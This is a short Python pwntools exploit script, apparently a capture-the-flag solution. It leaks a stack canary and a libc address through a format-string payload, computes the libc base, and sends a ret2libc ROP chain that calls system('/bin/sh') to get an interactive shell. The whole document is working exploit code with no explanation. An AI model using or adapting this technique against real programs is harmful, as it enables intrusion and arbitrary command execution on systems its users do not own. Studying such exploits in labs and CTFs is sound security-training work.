from pwn import *
from threading import Thread

libc = ELF('libc.so.6', checksec=False)

io = start()

io.sendlineafter(b"?", b"%23$llx-%18$llx")
io.recvline()
data = io.recvline().strip().decode("utf-8").split('-')

cookie, stdout = data
cookie, stdout = int(cookie, 16), int(stdout, 16)

libc.address = stdout - libc.symbols['stdout'] + 232

padding = b"A" * 72
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
pop_rdi_ret = libc.address + 0x0000000000023b72

payload = [
    padding, cookie,
    b"A" * 8, pop_rdi_ret+1,
    pop_rdi_ret ,bin_sh,
    system, libc.symbols['exit'] 
]

io.sendline(flat(payload))

io.interactive()